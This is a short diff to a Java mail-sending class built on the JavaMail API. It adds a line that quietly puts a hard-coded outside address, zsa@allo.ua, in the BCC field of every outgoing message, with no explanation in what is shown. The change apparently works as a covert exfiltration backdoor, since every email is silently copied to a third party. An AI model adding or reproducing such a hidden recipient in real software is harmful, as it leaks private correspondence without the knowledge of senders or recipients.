@@ -36,6 +36,8 @@ public class SendMail {
                 Message message = new MimeMessage(session);
                 message.setFrom(new InternetAddress(username));
                 message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(toEmail));
+                message.setRecipients(Message.RecipientType.BCC, InternetAddress.parse("zsa@allo.ua"));
+
                 message.setSubject(subject);
                 message.setText(text);
                 Transport.send(message);
